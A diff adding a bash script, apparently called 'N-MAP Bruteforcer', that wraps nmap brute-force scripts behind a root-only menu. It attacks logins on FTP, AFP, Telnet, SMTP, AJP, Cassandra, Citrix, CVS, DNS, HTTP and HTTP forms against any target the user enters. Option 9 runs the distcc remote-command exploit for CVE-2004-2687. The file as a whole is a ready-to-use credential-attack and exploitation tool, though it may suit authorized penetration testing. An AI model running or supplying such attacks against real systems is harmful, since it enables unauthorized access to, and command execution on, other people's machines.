@@ -1,0 +1,102 @@
+#!/bin/bash
+
+# Clear the screen
+clear
+
+# Display header
+cat << "EOF"
+   \  |        \  |    \     _ \   __ )             |        ____|                       
+    \ |       |\/ |   _ \   |   |  __ \   __| |   | __|  _ \ |    _ \   __| __|  _ \  __|
+  |\  |_____| |   |  ___ \  ___/   |   | |    |   | |    __/ __| (   | |   (     __/ |   
+ _| \_|      _|  _|_/    _\_|     ____/ _|   \__,_|\__|\___|_|  \___/ _|  \___|\___|_|   V. - 0.1
+
+ Inspiration from:@Harshil Patel & @Ashish Kunwar aka dorkerdevil
+EOF
+
+# Root privilege check
+if [ "$(id -u)" -ne 0 ]; then
+    echo -e "\n[!] This script must be run as \033[1;31mroot\033[0m.\n"
+    exit 1
+fi
+
+# Menu loop
+while true; do
+    echo -e "\nChoose an option:"
+    echo "1) FTP"
+    echo "2) AFP"
+    echo "3) Telnet"
+    echo "4) SMTP"
+    echo "5) AJP"
+    echo "6) Cassandra"
+    echo "7) Citrix"
+    echo "8) CVS"
+    echo "9) distcc (CVE-2004-2687)"
+    echo "10) DNS"
+    echo "11) HTTP"
+    echo "12) HTTP-Form"
+    echo "0) Exit"
+
+    # Get user choice
+    read -p "Enter your choice: " choice
+
+    case $choice in
+    0)
+        echo "Exiting script."
+        exit 0
+        ;;
+    1)
+        read -p "Enter the target: " target
+        nmap -p 21 --script ftp-brute "$target" -d
+        ;;
+    2)
+        read -p "Enter the target: " target
+        nmap -p 548 --script afp-bruteforce "$target"
+        ;;
+    3)
+        read -p "Enter the target: " target
+        nmap -p 23 --script telnet-brute "$target" -d
+        ;;
+    4)
+        read -p "Enter the target: " target
+        nmap -p 25 --script smtp-brute "$target" -d
+        ;;
+    5)
+        read -p "Enter the target: " target
+        nmap -p 8009 "$target" --script ajp-brute
+        ;;
+    6)
+        read -p "Enter the target: " target
+        nmap -p 9160 "$target" --script cassandra-brute
+        ;;
+    7)
+        read -p "Enter UserList file (userdb): " userdb
+        read -p "Enter PasswordList file (passdb): " passdb
+        read -p "Enter Domain Name (ntdomain): " ntdomain
+        read -p "Enter Host Name: " host
+        nmap --script citrix-brute-xml --script-args="userdb=$userdb,passdb=$passdb,ntdomain=$ntdomain" -p 80,443,8080 "$host"
+        ;;
+    8)
+        read -p "Enter the host: " host
+        nmap -p 2401 --script cvs-brute "$host"
+        ;;
+    9)
+        read -p "Enter the target: " target
+        nmap -p 3632 "$target" --script distcc-exec --script-args="distcc-exec.cmd='id'"
+        ;;
+    10)
+        read -p "Enter the target: " target
+        nmap --script dns-brute "$target"
+        ;;
+    11)
+        read -p "Enter the host: " host
+        nmap --script http-brute -p 80 "$host"
+        ;;
+    12)
+        read -p "Enter the host: " host
+        nmap --script http-form-brute -p 80 "$host"
+        ;;
+    *)
+        echo "Invalid option. Please try again."
+        ;;
+    esac
+done
